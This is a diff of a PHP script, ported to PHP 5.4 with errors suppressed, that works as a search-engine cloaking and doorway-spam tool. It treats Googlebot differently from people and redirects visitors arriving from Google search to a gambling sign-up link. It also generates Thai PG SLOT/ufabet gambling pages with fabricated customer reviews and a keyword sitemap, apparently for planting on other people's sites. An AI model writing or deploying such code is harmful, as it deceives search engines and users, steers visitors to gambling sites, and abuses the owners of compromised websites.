@@ -1,34 +1,30 @@
 <?php
-declare(strict_types=1);
+// Final Script - Compatible with PHP 5.4.44 (Debian Wheezy)
+error_reporting(0);
 
-$ip = $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$ip = isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown');
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 
-$scheme = (($_SERVER['HTTPS'] ?? '') === 'on') ? 'https' : 'http';
-$basePath = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost');
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+$basePath = $scheme . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost');
+$baseUrl = $basePath . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '');
 
-$baseUrl = $basePath . ($_SERVER['REQUEST_URI'] ?? '');
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
 
-$googleBotUserAgents = [
-    "Googlebot",
-    "Googlebot-Image",
-    "Googlebot-News",
-    "Googlebot-Video",
-    "Google-InspectionTool",
-    "Google-Site-Verification"
-];
+$googleBotUserAgents = array(
+    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video",
+    "Google-InspectionTool", "Google-Site-Verification"
+);
 
 $isGooglebot = false;
-foreach ($googleBotUserAgents as $googleUserAgent) {
-    if (stripos($userAgent, $googleUserAgent) !== false) {
+foreach ($googleBotUserAgents as $agent) {
+    if (stripos($userAgent, $agent) !== false) {
         $isGooglebot = true;
         break;
     }
 }
 
-// Tambahan: redirect jika pengunjung manusia berasal dari Google
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-$isFromGoogleSearch = !$isGooglebot && stripos($referer, 'google.') !== false;
+$isFromGoogleSearch = (!$isGooglebot && stripos($referer, 'google.') !== false);
 
 if ($isFromGoogleSearch) {
     header('Location: https://listrik.org/publicenemy');
@@ -36,7 +32,7 @@ if ($isFromGoogleSearch) {
 }
 
 $paramFile = __DIR__ . '/param.txt';
-$validKeys = [];
+$validKeys = array();
 if (is_readable($paramFile)) {
     $content = file_get_contents($paramFile);
     if ($content !== false) {
@@ -44,9 +40,9 @@ if (is_readable($paramFile)) {
     }
 }
 
-function getValidKey(array $validKeys): ?string {
+function getValidKey($validKeys) {
     foreach ($validKeys as $key) {
-        $value = filter_input(INPUT_GET, $key, FILTER_SANITIZE_STRING);
+        $value = isset($_GET[$key]) ? filter_var($_GET[$key], FILTER_SANITIZE_STRING) : null;
         if ($value !== null && $value !== false) {
             return $key;
         }
@@ -56,13 +52,12 @@ function getValidKey(array $validKeys): ?string {
 
 $key = getValidKey($validKeys);
 
-function getUrl(string $keyword, string $key): string {
+function getUrl($keyword, $key) {
     global $basePath;
-
-    $urlPath = strtok($_SERVER['REQUEST_URI'] ?? '', '?');
-    $url = $basePath . $urlPath . "?{$key}=" . str_replace(' ', '+', $keyword);
-    if (strpos($url, "?{$key}=sitemap.xml") !== false) {
-        $url = str_replace("?{$key}=sitemap.xml", '', $url);
+    $urlPath = strtok(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', '?');
+    $url = $basePath . $urlPath . "?" . $key . "=" . str_replace(' ', '+', $keyword);
+    if (strpos($url, "?" . $key . "=sitemap.xml") !== false) {
+        $url = str_replace("?" . $key . "=sitemap.xml", '', $url);
     }
     return $url;
 }
@@ -74,8 +69,8 @@ if ($key === null) {
     exit;
 }
 
-$domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
-$brand = filter_input(INPUT_GET, $key, FILTER_SANITIZE_STRING) ?? 'brand';
+$domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
+$brand = isset($_GET[$key]) ? filter_var($_GET[$key], FILTER_SANITIZE_STRING) : 'brand';
 
 $signUp = 'https://listrik.org/publicenemy';
 $banner = 'https://image.cdn2.seaart.me/temp-convert-webp/highwebp/2025-02-25/cuusqp5e878c73ctokh0/dad0f2a8b4eb814e22e8099e95c01773_low.webp';
@@ -84,7 +79,7 @@ $logo = 'https://i.ibb.co/HPqvPf8/logo.png';
 $brandUp = strtoupper($brand);
 
 $keywordFile = __DIR__ . '/thaikeyword.txt';
-$keywords = [];
+$keywords = array();
 if (is_readable($keywordFile)) {
     $contents = file_get_contents($keywordFile);
     if ($contents !== false) {
@@ -92,41 +87,44 @@ if (is_readable($keywordFile)) {
     }
 }
 
-$title = "{$brand} เปิด PG SLOT ธีมโรงเรียนเวทมนตร์ สนุกแบบฮอกวอตส์";
-$description = "ร่วมเรียนคาถาใน PG SLOT โรงเรียนเวทมนตร์จาก {$brand} พร้อมลุ้นโบนัสในชั้นเรียนลับ";
-$article = "PG SLOT โรงเรียนเวทมนตร์ของ {$brand} ให้ผู้เล่นเก็บสะสมคาถา ประลองเวทย์ และค้นหาโบนัสในห้องเรียนลับ เหมือนได้เข้าเรียนฮอกวอตส์ของจริง.";
+$title = $brand . " เปิด PG SLOT ธีมโรงเรียนเวทมนตร์ สนุกแบบฮอกวอตส์";
+$description = "ร่วมเรียนคาถาใน PG SLOT โรงเรียนเวทมนตร์จาก " . $brand . " พร้อมลุ้นโบนัสในชั้นเรียนลับ";
+$article = "PG SLOT โรงเรียนเวทมนตร์ของ " . $brand . " ให้ผู้เล่นเก็บสะสมคาถา ประลองเวทย์ และค้นหาโบนัสในห้องเรียนลับ เหมือนได้เข้าเรียนฮอกวอตส์ของจริง.";
 
 $reviews_user1 = "pgslot";
 $reviews_user2 = "ufabet";
 $reviews_user3 = "pgfish";
 
-$content_user1 = "ฉันซื้อหูฟังสำหรับเล่นเกมจากร้านนี้และคุณภาพดีมาก! บริการเป็นกันเอง จัดส่งรวดเร็ว เหมาะกับคนที่เล่นเกมออนไลน์บ่อยๆเหมือนผมจริงๆ แม้แต่ตอนเล่นบน ufabet เสียงก็ยังชัดเจนมากทำให้ประสบการณ์ตื่นเต้นมากยิ่งขึ้น แน่นอนจะกลับมาซื้อของที่นี่อีกครั้ง!";
-$content_user2 = "เสื้อผ้าโอเคตามภาพเนื้อผ้าเย็นใส่สบายค่ะ ขนาดก็พอดีเป๊ะเลย ส่งเร็วอีกแล้ว. เมื่อวานลองใช้ไลฟ์สดกับเพื่อนๆในกลุ่ม ufabet แล้วคนถามมาเยอะว่าซื้อได้ที่ไหน ที่แนะนำ!";
-$content_user3 = "เคสโทรศัพท์ที่ฉันซื้อที่นี่ดูเท่และไม่ซ้ำใคร! ราคาถูก คุณภาพดี และให้บริการตอบกลับรวดเร็ว ผมชอบมากเพราะว่าสามารถเล่นและพูดคุยกับชุมชน ufabet ได้แบบเห็นความแตกต่าง ร้านนี้เป็นหนึ่งในร้านที่ต้องอยู่ในรายการความต้องการของคุณ!";
+$content_user1 = "ฉันซื้อหูฟังสำหรับเล่นเกมจากร้านนี้และคุณภาพดีมาก!...";
+$content_user2 = "เสื้อผ้าโอเคตามภาพเนื้อผ้าเย็นใส่สบายค่ะ...";
+$content_user3 = "เคสโทรศัพท์ที่ฉันซื้อที่นี่ดูเท่และไม่ซ้ำใคร!...";
 
-function isMobile(): bool {
-    global $userAgent;
-    return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $userAgent)
-        || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($userAgent, 0, 4));
+function isMobile() {
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    return preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i', $userAgent);
 }
 
 if ($brand === 'sitemap.xml') {
     header('Content-Type: application/xml; charset=utf-8');
     header('Accept-Ranges: bytes');
 
-    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>');
+    $xmlHeader = '<?xml version="1.0" encoding="UTF-8"?>';
+    $xmlHeader .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
 
     foreach ($keywords as $keyword) {
         foreach ($validKeys as $paramKey) {
-            $urlElement = $xml->addChild('url');
-            $urlElement->addChild('loc', htmlspecialchars(getUrl($keyword, $paramKey)));
-            $urlElement->addChild('lastmod', date('Y-m-d'));
-            $urlElement->addChild('changefreq', 'daily');
-            $urlElement->addChild('priority', '0.8');
+            $loc = htmlspecialchars(getUrl($keyword, $paramKey));
+            $xmlHeader .= "<url>";
+            $xmlHeader .= "<loc>{$loc}</loc>";
+            $xmlHeader .= "<lastmod>" . date('Y-m-d') . "</lastmod>";
+            $xmlHeader .= "<changefreq>daily</changefreq>";
+            $xmlHeader .= "<priority>0.8</priority>";
+            $xmlHeader .= "</url>";
         }
     }
 
-    echo $xml->asXML();
+    $xmlHeader .= '</urlset>';
+    echo $xmlHeader;
     exit;
 }
 ?>
